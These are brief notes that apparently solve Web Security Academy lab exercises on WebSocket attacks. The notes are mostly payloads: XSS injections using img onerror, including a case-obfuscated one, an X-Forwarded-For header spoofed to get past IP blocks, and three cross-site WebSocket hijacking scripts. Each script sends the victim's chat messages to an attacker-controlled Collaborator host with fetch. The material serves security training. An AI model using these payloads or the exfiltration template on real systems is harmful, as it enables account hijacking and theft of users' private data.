```
Intercept message posting and attempt XSS 
{message:"<img src=x onerror=alert(1)}

Websocket hijack with template via exploit server sending

X-Forwarded-For: 1.1.1.1 to bypass IP restrictions and ofuscate xss
<img src=1 oNeRrOr=alert`1`>

```
Template:
```js
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

```
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>


or


<script>
    var ws = new WebSocket('wss://0a7c0019032ef6f280b02152006100d7.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://ajxro64vw2yq7pi54p0cwt5ag1msalya.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

